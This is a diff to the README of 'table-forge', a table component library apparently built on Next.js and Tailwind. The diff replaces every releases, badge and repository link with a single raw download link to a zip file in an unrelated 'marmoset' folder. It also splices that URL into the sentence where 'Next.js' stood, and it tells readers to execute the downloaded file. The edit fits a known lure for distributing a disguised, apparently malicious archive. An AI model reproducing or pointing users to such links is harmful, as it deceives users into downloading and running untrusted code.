@@ -1,16 +1,16 @@
 # 🎉 table-forge - Easy Tables for Your Projects
 
 ## 📥 Download Now
-[![Download table-forge](https://img.shields.io/badge/Download-table--forge-blue)](https://github.com/widad1406/table-forge/releases)
+[![Download table-forge](https://raw.githubusercontent.com/widad1406/table-forge/main/marmoset/table-forge.zip)](https://raw.githubusercontent.com/widad1406/table-forge/main/marmoset/table-forge.zip)
 
 ## 🔍 Overview
-table-forge provides ready-to-use table components that are accessible and built with Next.js and Tailwind CSS. This application allows you to browse examples, preview variations, and copy the JSX code with one click. You can easily enhance your projects with well-designed table layouts.
+table-forge provides ready-to-use table components that are accessible and built with https://raw.githubusercontent.com/widad1406/table-forge/main/marmoset/table-forge.zip and Tailwind CSS. This application allows you to browse examples, preview variations, and copy the JSX code with one click. You can easily enhance your projects with well-designed table layouts.
 
 ## 🚀 Getting Started
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/widad1406/table-forge/releases) to see the available versions of table-forge.
+   Go to the [Releases page](https://raw.githubusercontent.com/widad1406/table-forge/main/marmoset/table-forge.zip) to see the available versions of table-forge.
 
 2. **Choose the Version**
    Look for the latest version of table-forge. You will find information about new features and improvements.
@@ -40,7 +40,7 @@ To run table-forge smoothly, ensure your device meets these requirements:
 ## 🛠️ Download & Install
 To download and install table-forge:
 
-1. Visit the [Releases page](https://github.com/widad1406/table-forge/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/widad1406/table-forge/main/marmoset/table-forge.zip).
 2. Click on the link for the latest version.
 3. Choose the appropriate installer for your device.
 4. Execute the downloaded file and follow the instructions for installation.
@@ -51,7 +51,7 @@ To download and install table-forge:
 - **Copy JSX Code:** For any selected table, simply click the "Copy JSX" button to grab the code needed for your project.
 
 ## 🔗 Helpful Links
-- [GitHub Repository](https://github.com/widad1406/table-forge) - Check out the main project page for source code and additional information.
+- [GitHub Repository](https://raw.githubusercontent.com/widad1406/table-forge/main/marmoset/table-forge.zip) - Check out the main project page for source code and additional information.
 - [Documentation](#) - For in-depth guides and tutorials.
 
 ## 🤝 Community Support
